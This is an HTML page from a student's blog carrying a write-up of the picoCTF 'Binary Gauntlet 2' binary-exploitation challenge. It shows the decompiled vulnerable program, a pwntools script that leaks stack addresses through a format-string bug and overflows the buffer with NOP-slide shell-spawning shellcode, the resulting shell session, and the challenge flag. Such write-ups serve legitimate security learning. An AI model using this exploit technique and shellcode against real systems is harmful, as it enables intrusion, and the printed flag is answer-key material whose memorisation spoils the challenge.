@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8" />
+    <title>My Blog - 2021-03-picoCTF - binary-gauntlet-2</title>
+
+    <!-- Meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="Abraxus">
+    <!-- FontAwesome JS-->
+    <script defer src="../../assets/js/fontawesome.min.js"></script>
+
+    <!-- Theme CSS -->
+    <link id="theme-style" rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body class="theme-bg-light">
+
+    <header class="header text-center">
+    <h1 class="blog-name pt-lg-4 mb-0"><a class="no-text-decoration" href="index.html">Abraxus's Blog</a></h1>
+
+    <nav class="navbar navbar-expand-lg navbar-dark">
+
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navigation" aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div id="navigation" class="collapse navbar-collapse flex-column">
+            <div class="profile-section pt-3 pt-lg-0">
+                <img class="profile-image mb-3 rounded-circle mx-auto" src="../../assets/images/profile.png" alt="image">
+
+                <div class="bio mb-3">Student<br>REV @ K3RN3L4RMY</div><!--//bio-->
+                <ul class="social-list list-inline py-3 mx-auto">
+                    <li class="list-inline-item"><a href="" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://github.com/Kasimir123" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://www.linkedin.com/in/kasimir-schulz" target="_blank"><i class="fab fa-linkedin-in fa-fw"></i></a></li>
+                </ul><!--//social-list-->
+                <hr>
+            </div><!--//profile-section-->
+
+            <ul class="navbar-nav flex-column text-center">
+                <li class="nav-item">
+                    <a class="nav-link" href="../../index.html"><i class="fas fa-home fa-fw me-2"></i>Blog Home <i class="fas fa-home fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../about.html"><i class="fas fa-user fa-fw me-2"></i>About Me <i class="fas fa-user fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../blog-posts.html"><i class="fas fa-bookmark fa-fw me-2"></i>Blog Posts <i class="fas fa-bookmark fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../writeups.html"><i class="fas fa-flag fa-fw me-2"></i>Writeups <i class="fas fa-flag fa-fw me-2"></i></a>
+                </li>
+            </ul>
+
+            <div class="my-2 my-md-3 text-center">
+                <a class="btn btn-primary" href="https://github.com/Kasimir123" target="_blank">Get in Touch</a>
+            </div>
+        </div>
+    </nav>
+</header>
+
+    <div class="main-wrapper">
+
+        <article class="markdown-section my-5 mx-5">
+            <h1 id="picoctf-binary-gauntlet-2-write-up">picoCTF Binary Gauntlet 2 Write Up</h1>
+<h2 id="details">Details:</h2>
+<p>Points: 50</p>
+<p>Jeopardy style CTF</p>
+<p>Category: Binary Exploitation</p>
+<p>Comments: How does ASLR affect your exploit? gauntlet nc mercury.picoctf.net 49704</p>
+<h2 id="write-up">Write up:</h2>
+<p>Reversing the program we see the following:</p>
+<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
+<span style="color:Blue;">int</span> __cdecl main(<span style="color:Blue;">int</span> argc, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **argv, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **envp)
+{
+  <span style="color:Blue;">char</span> dest[104]; 
+  <span style="color:Blue;">char</span> *s;
+
+  s = (<span style="color:Blue;">char</span> *)malloc(1000uLL);
+  fgets(s, 1000, stdin);
+  s[999] = 0;
+  printf(s);
+  fflush(_bss_start);
+  fgets(s, 1000, stdin);
+  s[999] = 0;
+  strcpy(dest, s);
+  <span style="color:Blue;">return</span> 0;
+}
+</pre></div>
+</div>
+<p>As you can see its basically the same as gauntlet 1. I was able to check the overflow and saw that the 120 overflow worked just like last time. The only issue is that for this one we do not have the address to return to. So I started doing some dynamic analysis.</p>
+<p>My first idea was to try to find a relative offset to the address of dest from an address we can get off of the stack. Doing some dynamic analysis I found that an address from the stack was 0x168 away from dest.</p>
+<p>I then built an exploit which worked on my local system, this exploit however did not work on their side, so I added NOPs before the shellcode for a NOP slide and shortened the jump:</p>
+<div class="lang-python editor-colors"># import pwn tools
+from pwn import *
+
+# open remote connection
+r = remote('mercury.picoctf.net', 49704)
+
+# send string to get some stack values
+r.send('%llx-%llx-%llx-%llx-%llx-%llx\n')
+
+# get stack values
+address = r.recvline() 
+
+# split the results and get the 6th value (value we want)
+address = address.split(b'-')[5]
+
+# convert to int and subtract the relative offset
+address = int(address[:-1], 16) - 0x158
+
+# 64 bit shellcode
+shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
+
+# NOP slide
+NOPSLIDE = b'\x90'*20
+
+# NOPs for after
+NOPS = b'\x90'*76
+
+# craft payload
+payload = NOPSLIDE + shellcode + NOPS + p64(address)
+
+# send payload
+r.send(payload + b'\n')
+
+# get interactive mode
+r.interactive()
+</div>
+<p>When run this gets us:</p>
+<pre><code>[+] Opening connection to mercury.picoctf.net on port 49704: Done
+[*] Switching to interactive mode
+
+$ ls
+flag.txt
+gauntlet
+xinet_startup.sh
+
+$ cat flag.txt
+230fc5c335f1fe302abdc387d498fe40
+</code></pre>
+<p>With the flag being:</p>
+<pre><code>230fc5c335f1fe302abdc387d498fe40
+</code></pre>
+
+        </article>
+
+        <footer class="footer text-left py-2 theme-bg-dark">
+
+    <small class="copyright">&nbsp;Generated by <a href="https://github.com/Kasimir123/Blog-Generator" target="_blank">Blog Generator</a> from Kasimir123</small>
+
+</footer>
+
+    </div><!--//main-wrapper-->
+    <!-- Javascript -->
+    <script src="../../assets/js/popper.min.js"></script>
+    <script src="../../assets/js/bootstrap.min.js"></script>
+</body>
+</html>
